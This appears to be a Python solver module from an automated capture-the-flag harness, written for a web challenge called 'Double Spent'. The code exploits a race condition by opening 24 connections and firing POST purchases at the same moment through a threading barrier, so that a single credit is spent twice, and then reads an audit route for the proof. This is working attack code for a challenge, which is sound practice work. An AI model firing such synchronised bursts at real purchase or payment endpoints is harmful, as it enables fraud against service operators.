"""Day 21 web "Double Spent" (cal. day 27): race condition / double spend on a one-credit purchase.

Kit (all furniture): {framework, feature_route, current_role, secondary_route}. The feature route is a POST-only
purchase (`405 post_required` on GET; POST -> `{"ok":..,"credits":N,"effect":..}`, 409 `credit_unavailable` once
the credit is gone). The secondary route is the audit: `403 {"error":"credit_not_overspent","credits":N}` until two
purchases landed on the one credit, then it carries the proof. Exploit: open N connections first, release every
POST at once through a barrier (last-byte sync), then read the audit.

ONE-SHOT per target: a single sequential POST (any other handler's probe) spends the credit and the target can never
be overspent afterwards -- so the gate is a side-effect-free GET of the audit route and the burst fires first.
"""
import http.client
import json
import re
import threading
import urllib.parse

from lib import websolve

KEY_MAP = [(r"^secondary_route$", "day27_web_double_spent")]

BURST = 24


def _post_burst(base, path, n=BURST, body=b"{}"):
    u = urllib.parse.urlsplit(base)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    conns, out = [], []
    lock = threading.Lock()
    barrier = threading.Barrier(n, timeout=8)

    def one():
        try:
            c = (http.client.HTTPSConnection if u.scheme == "https" else http.client.HTTPConnection)(host, port, timeout=8)
            c.connect()
        except Exception:  # noqa: BLE001
            c = None
        try:
            barrier.wait()
        except threading.BrokenBarrierError:
            pass
        if c is None:
            return
        try:
            c.request("POST", path, body=body, headers={"User-Agent": websolve.UA, "Content-Type": "application/json",
                                                        "Accept": "application/json", "Content-Length": str(len(body))})
            r = c.getresponse()
            txt = r.read(1 << 16).decode("utf-8", "replace")
            with lock:
                out.append((r.status, txt))
        except Exception:  # noqa: BLE001
            pass
        finally:
            c.close()

    ts = [threading.Thread(target=one, daemon=True) for _ in range(n)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(12)
    return out


def exploit(base, clues):
    base = base.rstrip("/")
    feat, sec = clues.get("feature_route"), clues.get("secondary_route")
    if not (isinstance(feat, str) and isinstance(sec, str) and feat.startswith("/") and sec.startswith("/")):
        return None
    st, body, _ = websolve.fetch(base + sec)
    if "credit" not in body.lower() and "spent" not in body.lower():
        return None
    p = websolve.proof(body)
    if p:
        return p
    for _ in range(2):
        for _st, txt in _post_burst(base, feat):
            p = websolve.proof(txt)
            if p:
                return p
        st, body, _ = websolve.fetch(base + sec)
        p = websolve.proof(body)
        if p:
            return p
        if re.search(r'"credits"\s*:\s*0\b', body) and "not_overspent" in body:
            return None  # credit spent without overlap: target burned (one-shot)
    return None


HANDLERS = {"day27_web_double_spent": exploit}
